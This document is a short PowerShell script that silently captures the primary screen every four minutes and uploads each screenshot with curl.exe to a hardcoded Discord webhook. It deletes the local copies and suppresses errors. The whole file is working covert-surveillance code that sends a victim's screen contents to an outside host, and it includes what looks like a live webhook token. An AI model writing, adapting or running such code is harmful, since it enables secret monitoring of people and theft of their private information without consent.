# ===============================================
# Silent Screenshot to Discord Every 4 Minutes
# ===============================================

$webhookUrl = "https://discord.com/api/webhooks/1507397879671685150/oRYUF8gCcyWpGAaRLBMA1pdAAvjRPq0iCfA7eXbnqI6-PZTVICQsAn-wbTbwjKMHyWoa"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Take-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $screenshot = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
  
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
  
    $tempFile = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
    $screenshot.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
  
    $graphics.Dispose()
    $screenshot.Dispose()
  
    return $tempFile
}

function Send-ToDiscord {
    param([string]$filePath)

    try {
        # Best method for Windows PowerShell 5.1 - using curl.exe
        curl.exe -s -F "file=@$filePath" $webhookUrl | Out-Null
        
        # Optional: Add username/content
        # curl.exe -s -F "payload_json={\`"username\`":\`"Screenshot Bot\`"}" -F "file=@$filePath" $webhookUrl | Out-Null
    }
    catch {
        # Silently fail
    }

    # Cleanup
    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
}

# ==================== Main Loop ====================
Write-Host "Starting silent screenshot every 4 minutes..." -ForegroundColor Green

while ($true) {
    $screenshotPath = Take-Screenshot
    Send-ToDiscord -filePath $screenshotPath

    Write-Host "$(Get-Date -Format 'HH:mm:ss') - Screenshot sent" -ForegroundColor Gray

    Start-Sleep -Seconds (4 * 60)  # 4 minutes
}
